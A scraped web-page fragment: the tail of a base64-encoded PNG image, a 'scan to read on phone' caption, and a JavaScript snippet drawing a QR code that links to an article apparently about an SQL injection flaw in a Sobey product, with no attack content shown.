M3H+gw4N7NgOdqwP3Wn0In/ldh+Qh2H35Gb48kLPipf39G5j++R3G6bq1T42oLkLqnvnmzUHq1EV9sevyM7RGhOwh7zVdh+s8nPu9T9/niq93yNXtvME7DAQydc/Spw3xIWgOws1DuL66qC6qw1gH4RA0Z90er7zK6UN6QbC8qwXJQbBnIbr99eUd9WGsq9xhIIYXvucGDr+HeIyaVi25WNp+qc/QrD6MTwWE65sX1TvCWFc+jBqEQ7AyVwuSe7a3vjjrCekHQXPWieqF6x1St/BB67c/ZUGmDcFn3wskB8HbLRUQ7lMC4XFv998D4PF/Qd5z8tvu60wr+1W95+Ri9dovyJm7D9HNdl9dhOSB9cfF24d9bf9kQaY0m6a66PchF2Hsoy5aJ8KYh/Duy+0DY658OGpXenmvLEjf2d4QH4Lm7A3RIdh1eeE2kCJrvf8GDp+yYJxiPyLE9ymAcAiah2tuToQxb3/9jvp7NKMmFyF76EM4BHsOove83Hzn6jOE9D3z1zvk7FbeqE0/ZTl1yDQh2HV5/x66LhfNyzvqd4ScQx3CAaXtE5qCveXAPaMuQnRz6nIRxhxcc+vE3ldeuN4h3tKH4HQgkKnX1PYLRr1/H2YhOTjHXieHMa/eEZJzvz32rNyMHNIDgurm4Fw39yrab5aH7AOs30NuH/a1fcrqU5RDpue51eXiTNfv2PPwvX0gdfBAe4vw8IDtKPoKcmD4GaMvmpOLXZdD+pm7wuk/WVdFy/vvbuDwKcupuqUcMmUI6sM1NyfO+qmbmyGM+1m3R2vhOmtOhDE/02HMuTeMuvX6clF9j+sd4u18CG4/Q2CcLozc8zpNuQjJ64v6M64OqTcv6s+4eiFc94D4EKyaWq/uAanr+epRS12E5MurpV6vZ2u9Q2Y38yb98DPEc8ymCZk6BM2JEB2C6vaF6DP+TNfvfdXPELKnNSJEt6brEF9dhOjWQTiMqP8M4VG33iHPbuuH/cNA4DEtYDuOT4eoAdw/s8uf+eYgdeZF/c7VRUg9PNAaiCaf1ajPsNfPcl3vdZDzmINwCKoXHgZS4lrvu4HtU1Y/Qp+yPhynWh5Eh2Cvh+iVrdX90l5ZMPbZ18Dc2+eevfZskH4wov6sDyQ/860/w/UOmd3am/TtU1af1uw8s5z6szp9yFMEQfUZwphzvzO0B7xWA2PO+rPepel3LO9smYPzffQL1zukbuGD1vYzBDI9eA39HnwiIHXy7/rWQfrJe191SA5Q2tAaUQP41ifDXt/7dl/eEcb9IRxY/z3k9mFf2z9ZTvsZ9vNDpmsdhJuD8JlvTl9Uf4bmC2dZyBme+fBabtZHvc5SS96xvFrq9dq1DURz4Xtv4DAQyFMCI86O6WQhebl5OYy+ujkRkpvxrkPy8EAz4myvZz48egLGNwSGn0UQDiNa4Dng3K/cYSAlrvW+G/hrA+nT799S9yFPySynbp1cnOn6hXC9B4z+Kz2rr+vVvDnIfr0eogPrU9btw77+2jtk9n1Bpq/v0yKH0YeR91yv179CSE8Imu294Nw3J1rf8Zlv3hyM+5X/nw+kNlnr9Rs4DMTpdXzWEo7TflZTvvtA6uXlnS1IDoLmz/Csfq9BekBQz14w6jBy8zPsfeTmOy/9MJAS13rfDWwDgUwfrvF3j+pTAGPfrs+4++nLRRj7Alob9lrg/vtD1+Uw+jByc24ghzEH59y6M9wGcmYu7edvYA3k5+/8csf/AQAA//+QfoveAAAABklEQVQDAHt2fbOS2b2cAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-Jzt-Business-userBusinessNumList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 